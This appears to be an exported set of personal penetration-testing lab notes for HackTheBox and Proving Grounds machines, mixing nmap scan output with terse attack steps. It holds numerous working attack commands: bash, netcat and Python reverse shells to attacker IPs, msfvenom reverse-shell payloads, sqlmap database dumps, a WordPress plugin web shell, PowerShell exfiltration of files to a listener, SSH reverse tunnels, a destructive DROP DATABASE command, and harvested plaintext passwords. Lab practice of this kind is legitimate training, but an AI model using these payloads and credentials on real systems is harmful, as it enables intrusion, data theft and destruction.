Connection: close<br />|     Content-Type: text/html; charset=utf-8<br />|     Content-Length: 232<br />|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;<br />|     &lt;title&gt;404 Not Found&lt;/title&gt;<br />|     &lt;h1&gt;Not Found&lt;/h1&gt;<br />|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br />|   GetRequest: <br />|     HTTP/1.0 200 OK<br />|     Server: gunicorn<br />|     Date: Thu, 08 Jul 2021 08:55:39 GMT<br />|     Connection: close<br />|     Content-Type: text/html; charset=utf-8<br />|     Content-Length: 19386<br />|     &lt;!DOCTYPE html&gt;<br />|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;<br />|     &lt;head&gt;<br />|     &lt;meta charset=&quot;utf-8&quot;&gt;<br />|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;<br />|     &lt;title&gt;Security Dashboard&lt;/title&gt;<br />|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br />|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;<br />|     &lt;!-- amchar<br />|   HTTPOptions: <br />|     HTTP/1.0 200 OK<br />|     Server: gunicorn<br />|     Date: Thu, 08 Jul 2021 08:55:39 GMT<br />|     Connection: close<br />|     Content-Type: text/html; charset=utf-8<br />|     Allow: OPTIONS, GET, HEAD<br />|     Content-Length: 0<br />|   RTSPRequest: <br />|     HTTP/1.1 400 Bad Request<br />|     Connection: close<br />|     Content-Type: text/html<br />|     Content-Length: 196<br />|     &lt;html&gt;<br />|     &lt;head&gt;<br />|     &lt;title&gt;Bad Request&lt;/title&gt;<br />|     &lt;/head&gt;<br />|     &lt;body&gt;<br />|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;<br />|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;<br />|     &lt;/body&gt;<br />|_    &lt;/html&gt;<br />|_http-server-header: gunicorn<br />|_http-title: Security Dashboard<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port80-TCP:V=7.91%I=7%D=7/8%Time=60E6BA97%P=x86_64-pc-linux-gnu%r(GetRe<br />SF:quest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20T<br />SF:hu,\x2008\x20Jul\x202021\x2008:55:39\x20GMT\r\nConnection:\x20close\r\n<br />SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201938<br />SF:6\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\n<br />SF:\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20<br />SF:&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\x<br />SF:20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x<br />SF:20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1<br />SF:\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image/<br />SF:png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;l<br />SF:ink\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;\<br />SF:n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/font<br />SF:-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20h<br />SF:ref=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\<br />SF:&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x20<br />SF:&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.c<br />SF:ss\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/cs<br />SF:s/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOptions<br />SF:,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\x20<br />SF:08\x20Jul\x202021\x2008:55:39\x20GMT\r\nConnection:\x20close\r\nContent<br />SF:-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20<br />SF:HEAD\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x20<br />SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/<br />SF:html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\<br />SF:x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n<br />SF:\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invalid<br />SF:\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP/<br />SF:1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189,<br />SF:&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Th<br />SF:u,\x2008\x20Jul\x202021\x2008:55:45\x20GMT\r\nConnection:\x20close\r\nC<br />SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\r<br />SF:\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20F<br />SF:inal//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\<br />SF:n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20serv<br />SF:er\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20che<br />SF:ck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=7/8%OT=21%CT=1%CU=35559%PV=Y%DS=2%DC=T%G=Y%TM=60E6BB2A<br />OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54<br />OS:DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6<br />OS:=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF<br />OS:=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%<br />OS:Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y<br />OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R<br />OS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IP<br />OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 554/tcp)<br />HOP RTT       ADDRESS<br />1   122.86 ms 10.10.14.1<br />2   123.98 ms 10.10.10.245<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1241.09 seconds<br /><br /><br /><a href="http://10.10.10.245/download/0">http://10.10.10.245/download/0</a><br /><br />nathan<br />Buck3tH4TF0RM3!<br /></div><div class='page'><h1 class='title level-2'>pandora.htb</h1><br/>snmp-check 10.10.11.136<br /><br />ssh<br />daniel -p HotelBabylon23<br /><br /><br />// $config[&quot;dbpass&quot;]=&quot;pandora&quot;;<br />// $config[&quot;dbuser&quot;]=&quot;pandora&quot;;<br /><br /><br /><br /><img src="images/91-1.png" alt="images/91-1.png" /><br /><br />proxychains sqlmap --url=&quot;<a href="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''"">http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot;</a> -D pandora --tables<br /><br /><br />proxychains sqlmap --url=&quot;<a href="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''"">http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot;</a> -Ttsessions_php --dump<br /><br />g4e01qdgk36mfdh90hvcc54umq steal matt&#39;s cookie put it in cookies in the browser<br /><br />shell exploit<br /><br />/ust/bin/at is on gtfobins <br /><br />then root with pandora_backup</div><div class='page'><h1 class='title level-2'>scriptkiddie.htb</h1><br/>msfconsole search msfvenom<br /><br />apk file upload vuln<br /><br />pwd&#39;s files<br />#!/bin/bash<br /><br />log=/home/kid/logs/hackers<br /><br />cd /home/pwn/<br />cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do<br />    sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot; &amp;<br />done<br /><br />if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi<br /><br /><br /><br />    HRI ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.39/6666 0&gt;&amp;1&#39; #<br />başına boşluk bırakmak lazım cut var script&#39;te<br />sonra sudo msfconsole cat /root/root.txt</div><div class='page'><h1 class='title level-2'>Love.htb</h1><br/>Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-11 01:14 +03<br />Stats: 0:08:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 36.12% done; ETC: 01:39 (0:15:39 remaining)<br />Stats: 0:12:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 51.52% done; ETC: 01:39 (0:11:48 remaining)<br />Nmap scan report for 10.10.10.239<br />Host is up (0.11s latency).<br />Not shown: 65517 closed ports<br />PORT      STATE SERVICE      VERSION<br />80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)<br />| http-cookie-flags: <br />|   /: <br />|     PHPSESSID: <br />|_      httponly flag not set<br />|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27<br />|_http-title: Voting System using PHP<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br />443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)<br />|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27<br />|_http-title: 403 Forbidden<br />| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in<br />| Not valid before: 2021-01-18T14:00:16<br />|_Not valid after:  2022-01-18T14:00:16<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|_  http/1.1<br />445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)<br />3306/tcp  open  mysql?<br />| fingerprint-strings: <br />|   DNSStatusRequestTCP, GetRequest, NULL: <br />|_    Host &#39;10.10.16.39&#39; is not allowed to connect to this MariaDB server<br />5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)<br />|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27<br />|_http-title: 403 Forbidden<br />5040/tcp  open  unknown<br />5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />| ssl-cert: Subject: commonName=LOVE<br />| Subject Alternative Name: DNS:LOVE, DNS:Love<br />| Not valid before: 2021-04-11T14:39:19<br />|_Not valid after:  2024-04-10T14:39:19<br />|_ssl-date: 2021-05-10T23:16:06+00:00; +32m58s from scanner time.<br />| tls-alpn: <br />|_  http/1.1<br />47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49664/tcp open  msrpc        Microsoft Windows RPC<br />49665/tcp open  msrpc        Microsoft Windows RPC<br />49666/tcp open  msrpc        Microsoft Windows RPC<br />49667/tcp open  msrpc        Microsoft Windows RPC<br />49668/tcp open  msrpc        Microsoft Windows RPC<br />49669/tcp open  msrpc        Microsoft Windows RPC<br />49670/tcp open  msrpc        Microsoft Windows RPC<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port3306-TCP:V=7.91%I=7%D=5/11%Time=6099B63C%P=x86_64-pc-linux-gnu%r(NU<br />SF:LL,4A,&quot;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.39&#39;\x20is\x20not\x20allow<br />SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,4<br />SF:A,&quot;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.39&#39;\x20is\x20not\x20allowed\x<br />SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStatusRequest<br />SF:TCP,4A,&quot;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.39&#39;\x20is\x20not\x20allo<br />SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/11%OT=80%CT=1%CU=31807%PV=Y%DS=2%DC=T%G=Y%TM=6099B6F<br />OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=111%CI=I%TS=U)SEQ(SP=FD%GCD=<br />OS:1%ISR=110%CI=I%II=I%TS=U)OPS(O1=M54BNW8NNS%O2=M54BNW8NNS%O3=M54BNW8%O4=M<br />OS:54BNW8NNS%O5=M54BNW8NNS%O6=M54BNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W<br />OS:5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54BNW8NNS%CC=N%Q=)T1(R=Y%DF=Y<br />OS:%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=<br />OS:)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A<br />OS:=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%D<br />OS:F=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O<br />OS:=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=<br />OS:G)IE(R=Y%DFI=N%T=80%CD=Z)<br /><br />Network Distance: 2 hops<br />Service Info: Hosts: <a href="http://www.example.com,">www.example.com,</a> LOVE, <a href="http://www.love.htb;">www.love.htb;</a> OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 2h17m58s, deviation: 3h30m02s, median: 32m57s<br />| smb-os-discovery: <br />|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)<br />|   OS CPE: cpe:/o:microsoft:windows_10::-<br />|   Computer name: Love<br />|   NetBIOS computer name: LOVE\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2021-05-10T16:15:53-07:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-10T23:15:51<br />|_  start_date: N/A<br /><br />TRACEROUTE (using port 110/tcp)<br />HOP RTT       ADDRESS<br />1   183.92 ms 10.10.16.1<br />2   78.31 ms  10.10.10.239<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1698.47 seconds<br /><br /><br /><br /><br /><br /><br />sqlmap -r love.txt -D votesystem -T admin -C id,username,password --dbms=mysql --dump<br /><br />sqlmap -r love.txt -D votesystem -T candidates -C id,username,password --dbms=mysql --dump<br />candidates<br /><br />Database: votesystem<br />Table: admin<br />[1 entry]<br />+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+<br />| id | photo                       | lastname | password                                                     | username | firstname | created_on |<br />+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+<br />| 1  | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018-04-02 |<br />+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+<br /><br /><br /><br /><br />msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.39 LPORT=6667 -f msi -o test.msi<br /></div><div class='page'><h1 class='title level-2'>Compromised.htb</h1><br/>└─# nmap -sV -sC     192.168.178.152  -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-29 21:47 +03<br />Nmap scan report for 192.168.178.152<br />Host is up (0.14s latency).<br />Not shown: 65528 filtered ports<br />PORT      STATE SERVICE       VERSION<br />80/tcp    open  http          Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: IIS Windows Server<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br />443/tcp   open  ssl/http      Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: IIS Windows Server<br />| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite<br />| Not valid before: 2021-06-01T08:00:08<br />|_Not valid after:  2021-08-30T08:00:08<br />|_ssl-date: 2021-09-29T18:55:11+00:00; 0s from scanner time.<br />| tls-alpn: <br />|_  http/1.1<br />445/tcp   open  microsoft-ds?<br />5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49666/tcp open  msrpc         Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-09-29T18:54:36<br />|_  start_date: N/A<br /><br /><br />smbclient ==&gt;users$<br />└─# cat readme.txt<br />Please keep your personal shares locked down. Just because it&#39;s hidden it doesn&#39;t mean it&#39;s not accessible. Also, please stop storing passwords in your scripts. Encoding is not encryption and this information can be lifted from the logs. -Security<br /><br />smbclient ==&gt;scripts$<br />└─# cat profile.ps1   <br />$password = ConvertTo-SecureString &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA&#39;)))&quot; -AsPlainText -Force<br />                                                                                                                                                                                                                                                              <br />┌──(root💀kali)-[/home/kali/compromised]<br />└─# echo &#39;RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA&#39; | base64 -d<br />FriendsDontLetFriendsBase64Passwords  <br /><br /><br />PS C:\htb&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path &#39;c:/users/public/downloads/BloodHound.zip&#39; -Encoding Byte))<br />PS C:\htb&gt; Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64<br /><br /><br />$b64 = [System.convert]::ToBase64String((Get-Content -Path &#39;c:/troubleshooting/scripting/powershell-logs.csv&#39; -Encoding Byte))<br />Invoke-WebRequest -Uri http://192.168.49.178:443 -Method POST -Body $b64<br /><br /><br />evil-winrm -i 192.168.178.152 -u scripting -p FriendsDontLetFriendsBase64Passwords<br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>pit.htb</h1><br/></div><div class='page'><h1 class='title level-1'>Sanbox.local(PG)</h1><br/><br />22 mins to crack the pass! ( 2secs with 3080)<br /><br />wp_ajla_admin<br />!love29jan2006!<br /><br /><a href="file:///usr/share/seclists/Web-Shells/WordPress">/usr/share/seclists/Web-Shells/WordPress</a>/plugin-shell.php<br /><br /><span style="color:#060f94;">name should match zip and php!</span><br />zip php-reverse-shell.zip php-reverse-shell.php <br /><br />upload and get reverse shell<br /><br />wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami<br /><br />upload a msfvenom elf file to get a proper shell (did not work?)<br /><br />msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.119.182 LPORT=6666 -f elf &gt; robot.elf<br /><br /><br />instead python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.119.182&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);<br /><br />today rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.119.182 443 &gt;/tmp/f worked<br /><br />this worked for reverse shell<br /><br /><br />define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );                                                                                                                                                                 <br />                                                                                                                                                                                                  <br />/** MySQL database username */                                                                                                                                                                    <br />define( &#39;DB_USER&#39;, &#39;wp&#39; );                                                                                                                                                                        <br />                                                                                                                                                                                                  <br />/** MySQL database password */                                                                                                                                                                    <br />define( &#39;DB_PASSWORD&#39;, &#39;Lv9EVQq86cfi8ioWsqFUQyU&#39; );                                                                                                                                               <br />                                                                                                                                                                                                  <br />/** MySQL hostname */                                                                                                                                                                             <br />define( &#39;DB_HOST&#39;, &#39;10.5.5.11&#39; );<br /><br /><br /><br />from=&quot;10.11.1.250&quot;,command=&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8i68oKAAjP/AO8vyWLm/zN4IGJtefv0r796o9xAgL/05r4cDQaIeqNZmVEZrkqiE2qgfAwETteMELETLsA+x4/Y0yWqymLlnl/6Y2Z1wRu+QX+o71jWnetHlXPb26r+bbO5B4FeL4PcOq1NQp2p1LiZIWnsQklD8T4LjaVGRaEL3O+5GQsjVQFUfmW9nR1xPiFhUtE2DwTZMQnqK+JlIXs9g2wRYnxyIpX6ZyljiKtNGG16PSwVl1b4vXm3BOgY6ug0q63LMVoJN9agt6R1/iFoJnHai14WcU8+pC8zJr06N/xy40+frF6PrLu/hqoqNahQVrU5bnaxho6kK49ib7 www-data@ajla<br /><br /><br />ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -i /tmp/keys/id_rsa kali@192.168.119.182<br /><br />COMPILED EXPLOIT IN PARROT! CAUSE OF GCLIB VERSION IT DIDN&#39;T WORK!<br /><br /><br />mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e &#39;DROP DATABASE wordpress;&#39;<br /><br /><br /><code>select sys_exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.119.182 443 &gt;/tmp/f&#39;);</code><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.119.182 443 &gt;/tmp/f<br /><br /><br /><code>cat /etc/fstab</code><br /><br /><code>$username = &quot;sandbox\alex&quot;<br />$pwdTxt = &quot;Ndawc*nRoqkC+haZ&quot;<br />$securePwd = $pwdTxt | ConvertTo-SecureString <br />$credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd<br /><br /># Enable remote management on Poultry<br />$remoteKeyParams = @{<br />ComputerName = &quot;POULTRY&quot;</code><br />from=&quot;10.11.1.250&quot;,command=&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDD3HPssiuzvm0ms9s/Te5VytYc09Kskt7fNR5TuFmAWDhnv04mVAHeRrSQ5k1tlFIzQmVg+XGI+8aG3fRPNc12O8Z1UouKRnTAAxh7Y0L9nczS1xpU76mVgV0Iqju+pX8Ctac3rNuxQBOiGuRnge7TqS4m4yg/0uw04p7gbOPbUR8EMPAZKT6UsqIvRkZ0w4wuTEK0ugeEQ9dbQ0nE2fZCA89fUawBOG5M+tF5uFBZvRzpoeu5bjoGCFrwjNUuYk8a4RP1TvTSoTdN50OBkm3HH+mRYd7sgviGjKXlqZScmL4y+MXvAKn+mdhYrCRKpls4wh+SmhkW7uDcG9R58Jprpb4shO8b44wVA90Hm6kxOjaLZ4CuaaeFdaTqXdHG+9wYVGhEPiOHiHmLCE/WoM2JNLcslugRhIWD7Hj/M0o3CcxIxFtC5o5EHbm7XTiHNjn6Fuj52hXbyK1C+dUaV4kakSfYN0zWxa99f4yWL82bV1vb4rKbGoReO26VV0Qy3tc= mysql@zora<br /><br /><code>ssh -f -N -R 1080 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -i /var/lib/mysql/.ssh/id_rsa kali@</code>192.168.119.182<br /><br /><br />/etc/proxychains4.conf add 127.0.0.1 1080<br /><code>proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard</code><br /><br /><br />proxychains rdesktop -d sandbox -u alex 10.5.5.20  -5 -K -r clipboard:CLIPBOARD ==&gt;worked<br /><br /><br />wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows&quot;</div><div class='page'><h1 class='title level-2'>10.11.14 - Bob</h1><br/>FTP anon upload<br /><br />Upload msfvenom ASP<br /><br /><br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.182 LPORT=443 -f asp &gt; shell.asp</code><br /><br /><br />set binary (ftp transfer)<br /><br />upload accesschk.exe<br /><br /><br /><code>C:\&gt; accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *# If we are on a Windows XP SP0 or SP1 OS we will receive the following output         RW SSDPSRV        SERVICE_ALL_ACCESSRW upnphost        